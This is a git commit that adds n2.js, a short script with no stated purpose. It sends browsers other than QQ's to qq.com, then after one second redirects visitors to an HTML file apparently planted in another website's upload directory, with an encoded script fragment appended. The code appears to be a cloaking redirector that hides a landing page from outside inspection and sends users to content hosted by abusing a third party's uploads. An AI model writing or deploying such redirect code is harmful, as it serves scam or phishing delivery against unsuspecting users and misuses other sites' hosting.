af96c5b498d9d1beb1df41a27af8fdcdfffb32f7
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-04 16:36:11 +0800

    Create n2.js

---
+++ n2.js
@@ -0,0 +1,15 @@
+function leleua() {
+    var sUserAgent = navigator.userAgent.toLowerCase();
+    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
+    } else {
+        window.location.href = "https://qq.com";
+    }
+}
+
+leleua();
+
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://www.xinri.com/profile/upload/2024/01/04/rrq_20240104163529A040.htm?' + '?' + timestamp + '%3Cscript';
+    location.href = url;
+}, 1000);
